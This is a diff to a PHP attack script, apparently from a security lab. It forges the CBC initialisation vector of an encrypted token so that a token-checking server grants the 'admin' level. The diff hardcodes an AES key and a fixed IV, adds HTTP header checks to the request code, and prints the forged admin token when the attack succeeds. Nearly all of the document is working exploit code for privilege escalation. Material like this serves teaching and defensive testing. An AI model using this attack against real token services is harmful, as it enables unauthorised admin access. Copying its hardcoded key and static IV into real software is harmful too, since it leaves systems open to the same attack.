@@ -1,6 +1,10 @@
 <?php
 
-require_once ("oracle_library.php");
+define ("KEY", "rainbowclimbinghigh");
+define ("IV", "1234567812345678");
+define ("ALGO", "aes-128-cbc");
+
+require_once ("token_library.php");
 
 function xor_byte_array ($a1, $a2) {
 	if (count ($a1) != count ($a2)) {
@@ -42,7 +46,7 @@ function make_call ($token, $iv, $url = null) {
 				);
 
 	if (is_null ($url)) {
-		$ret = check_token (json_encode ($data));
+		$body = check_token (json_encode ($data));
 	} else {
 		$ch = curl_init();
 
@@ -52,22 +56,33 @@ function make_call ($token, $iv, $url = null) {
 		curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode ($data));
 
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_HEADER, true);
 
-		$ret = curl_exec($ch);
+		$response = curl_exec($ch);
+
+		$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+		$header = substr($response, 0, $header_size);
+		$body = substr($response, $header_size);
+
 		// May return false or something that evaluates to false
 		// so can't do strict type check
-		if ($ret == false) {
+		if ($response == false) {
 			print "Could not access remote server, is the URL correct?
+${url}
+";
+			exit;
+		}
+		if (strpos ($header, "200 OK") === false) {
+			print "Check token script not found, have you got the right URL?
 ${url}
 ";
 			exit;
 		}
 
 		curl_close($ch);
-
 	}
 
-	return json_decode ($ret, true);
+	return json_decode ($body, true);
 }
 
 function do_attack ($iv_string_b64, $token, $url) {
@@ -224,7 +239,8 @@ function do_attack ($iv_string_b64, $token, $url) {
 	print "New IV is: " . byte_array_to_string ($zeroing) . "\n";
 	print "\n";
 
-	print "Sending new data to server\n";
+	print "Sending new data to server...\n";
+	print "\n";
 
 	try {
 		$ret_obj = make_call ($token, $zeroing, $url);
@@ -233,7 +249,22 @@ function do_attack ($iv_string_b64, $token, $url) {
 		var_dump ($ret_obj);
 
 		if ($ret_obj['status'] == 200 && $ret_obj['level'] == "admin") {
-			print "Hack success!\n";
+			print "\n";
+			print "Hack success!\n\n";
+			print "The new token is:\n";
+
+			# This maps the IV byte array down to a string
+			$iv_string = implode(array_map("chr", $zeroing));
+
+			# Now base64 encode it so it is safe to send
+			$iv_string_b64 = base64_encode ($iv_string);
+
+			$new_token = array (
+								"token" => $token,
+								"iv" => $iv_string_b64
+							);
+			print json_encode ($new_token);
+			print "\n\n";
 		} else {
 			print "Hack failed\n";
 		}
@@ -270,7 +301,8 @@ To test locally, pass --local, otherwise pass the IV, token and URL for the remo
 } elseif (array_key_exists ("l", $options) || array_key_exists ("local", $options)) {
 	print "Creating the token locally\n\n";
 
-	$token_data = json_decode (create_token(true), true);
+	$iv = "1234567812345678";
+	$token_data = json_decode (create_token($iv, true), true);
 
 	$token = $token_data['token'];
 	$iv = $token_data['iv'];
